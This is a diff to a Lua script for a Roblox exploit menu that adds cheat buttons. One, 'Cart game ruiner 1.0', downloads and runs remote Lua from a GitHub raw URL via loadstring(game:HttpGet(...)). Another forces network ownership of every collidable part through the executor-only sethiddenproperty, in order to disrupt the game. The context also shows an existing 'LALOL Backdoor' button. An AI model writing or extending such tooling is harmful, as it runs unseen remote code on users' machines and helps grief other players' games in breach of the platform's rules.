@@ -518,6 +518,15 @@ local Tab = Window:CreateTab("Other", "computer")
 local Section = Tab:CreateSection("Section 1")
 a = a + 1
 local Button = Tab:CreateButton({
+   Name = "Cart game ruiner 1.0",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneus/master/refs/heads/main/cartruiner.lua"))()
+   end,
+})
+
+a = a + 1
+local Button = Tab:CreateButton({
    Name = "LALOL Backdoor",
    Callback = function()
    -- The function that takes place when the button is pressed
@@ -695,6 +704,22 @@ end
 
    end,
 })
+
+local Button = Tab:CreateButton({
+   Name = "Force part ownerships (need a weak security)",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+			for _, part in pairs(workspace:GetDescendants()) do
+    if part:IsA("BasePart") and part.CanCollide then
+					warn(part)
+        sethiddenproperty(part, "NetworkOwnershipRule", Enum.NetworkOwnership.Manual)
+        part:SetNetworkOwner(game.Players.LocalPlayer)
+    end
+end
+
+   end,
+})
+
 
         game:GetService("StarterGui"):SetCore("SendNotification", {
             Title = "Loaded!",
